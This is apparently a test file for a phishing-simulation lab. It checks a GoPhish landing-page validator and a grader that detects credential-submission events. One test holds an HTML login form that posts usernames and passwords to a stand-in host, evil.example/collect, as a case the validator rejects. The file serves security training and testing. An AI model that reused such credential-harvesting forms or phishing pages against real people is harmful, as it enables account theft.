"""Offline tests for lab 2: landing-form validation and the grader's
submission-event parser. The GoPhish/Mailpit round-trip is integration-tested
against a running stack (see infra/README.md), not here."""
import json
from pathlib import Path

import sys

ROOT = Path(__file__).resolve().parent.parent
sys.path.insert(0, str(ROOT / "publish"))
sys.path.insert(0, str(ROOT / "grader"))

from gophish_client import validate_landing_html  # noqa: E402
import grade as grader  # noqa: E402


def test_reference_portal_form_is_publishable():
    html = (ROOT / "reference-portal" / "index.html").read_text(encoding="utf-8")
    result = validate_landing_html(html)
    assert result["ok"], result["problems"]
    assert "password" in result["form"]["password_fields"]
    assert "username" in result["form"]["input_names"]


def test_starter_form_is_publishable():
    html = (ROOT / "student-starter" / "login.html").read_text(encoding="utf-8")
    result = validate_landing_html(html)
    assert result["ok"], result["problems"]


def test_broken_form_rejected_no_password():
    html = '<form method="post" action=""><input name="username"></form>'
    result = validate_landing_html(html)
    assert not result["ok"]
    assert any("password" in p for p in result["problems"])


def test_broken_form_rejected_wrong_action():
    html = ('<form method="post" action="https://evil.example/collect">'
            '<input name="username"><input type="password" name="password"></form>')
    result = validate_landing_html(html)
    assert not result["ok"]
    assert any("action" in p for p in result["problems"])


def test_no_form_rejected():
    assert not validate_landing_html("<html><body>no form</body></html>")["ok"]


def test_grader_matches_exact_fresh_marker():
    rid = "abc123"
    user = "dummy-cafe01"
    campaign = {
        "results": [{"id": rid, "email": "r1@lab.example"}],
        "timeline": [
            {"email": "r1@lab.example", "message": "Clicked Link"},
            {"email": "r1@lab.example", "message": "Submitted Data",
             "details": json.dumps({"payload": {
                 "username": [user], "password": ["pw"], "rid": [rid]}})},
        ],
    }
    assert grader.find_submission_event(campaign, rid, user) is not None
    # a different (stale/other) value must not satisfy the check
    assert grader.find_submission_event(campaign, rid, "dummy-other") is None


def test_grader_requires_submission_event():
    rid = "r"
    campaign = {"results": [{"id": rid, "email": "e@x"}],
                "timeline": [{"email": "e@x", "message": "Clicked Link"}]}
    assert grader.find_submission_event(campaign, rid, "dummy-x") is None


def test_grader_selftest_passes():
    assert grader.selftest() == 0
